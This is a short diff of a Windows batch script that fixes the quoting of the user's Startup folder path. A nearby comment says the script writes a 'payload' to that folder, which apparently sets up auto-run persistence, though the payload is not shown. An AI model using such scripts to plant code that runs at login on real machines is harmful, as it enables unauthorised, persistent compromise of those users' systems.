@@ -4,7 +4,7 @@
 
 
 @rem variables
-path = C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+path = C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
 
 
 @rem write the payload to startup
